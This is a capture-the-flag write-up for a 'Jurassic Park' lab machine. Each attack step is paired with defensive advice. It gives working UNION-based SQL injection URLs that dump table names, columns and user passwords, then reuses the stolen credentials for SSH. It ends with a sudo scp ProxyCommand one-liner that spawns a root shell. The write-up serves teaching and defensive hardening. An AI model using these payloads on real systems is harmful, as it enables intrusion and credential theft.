**Jurassic Park CTF — Offense vs Defense**

Setup
```
echo "Target_ip jurassic.park" >> /etc/hosts
```
Bound local DNS entry to resolve the challenge domain.

**Web Application**
===================
Accessed 
```
http://jurassic.park/
```
Found IDOR → hint of SQL injection.

Defender’s View:  
Implement input validation and parameterized queries. 
Use Web Application Firewalls (WAFs) to detect IDOR and SQLi attempts.
Regularly test endpoints with automated scanners.

**SQL Injection**
=================
SQL injection (SQLi) is the exploitation of insecure input handling in applications that pass user input directly into SQL queries without proper sanitization or parameterization.
```
http://jurassic.park/item.php?id=6 union select 1,2,3,4,database();
```

<img width="851" height="366" alt="jurassic_0_home_page" src="https://github.com/user-attachments/assets/1af9e58a-b44a-4b5c-a866-f38bcc100cdf" />

```
http://jurassic.park/item.php?id=6%20union%20select%201,2,3,4,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20=%20database();
```
Retrieved tables: items, users

```
http://jurassic.park/item.php?id=6%20union%20select%201,2,3,4,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%22users%22;
```
Extracted columns: id, username, password...

```
http://jurassic.park/item.php?id=6%20union%20select%201,2,3,4,version()%20;
http://jurassic.park/item.php?id=3%20UNION%20SELECT%201,2,3,4,password%20from%20users%20where%20id=1;
```
Revealed Ubuntu version and user passwords.

Defender’s View:
Enforce least privilege on database accounts.
Disable verbose error messages.
Encrypt and hash passwords properly (e.g., bcrypt).
Monitor logs for suspicious UNION SELECT queries.

**SSH Access**
==============
```
ssh denis@Target_IP
```
Used leaked credentials to gain shell.

Defender’s View:
Database user and ssh password should't be same.
Use multi-factor authentication for SSH.
Restrict login attempts with fail2ban.
Rotate credentials regularly and monitor for brute force attempts.

**Host Enumeration**
====================
Gathered In-depth info about target environment
```
Ran id, whoami, checked cron jobs, .bash_history
```
Used pspy64 to monitor scheduled tasks.
Discover important file and info which led to path for exploit or privilege escalate

Defender’s View:
Harden cron jobs with strict permissions.
Clear sensitive history files.
Monitor unusual binaries like pspy64 with file integrity monitoring.

**Privilege Escalation**
========================
```
scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
```
Exploited sudo privilege over /usr/bin/scp to gain root.

Defender’s View:
Audit sudo -l outputs regularly.
Restrict dangerous binaries in sudoers.
Apply [GTFOBins](https://gtfobins.org/gtfobins/scp/#shell) awareness in hardening guides. 
Use role-based access control to minimize root escalation paths.

🛡️ Defender Takeaways
Patch management: Keep OS and apps updated.
Principle of least privilege: Limit user and service permissions.
Monitoring & logging: Detect anomalies early.
Defense in depth: Layered controls (WAF, IDS/IPS, MFA, RBAC).
Regular audits: Review sudoers, cron jobs, and database permissions.
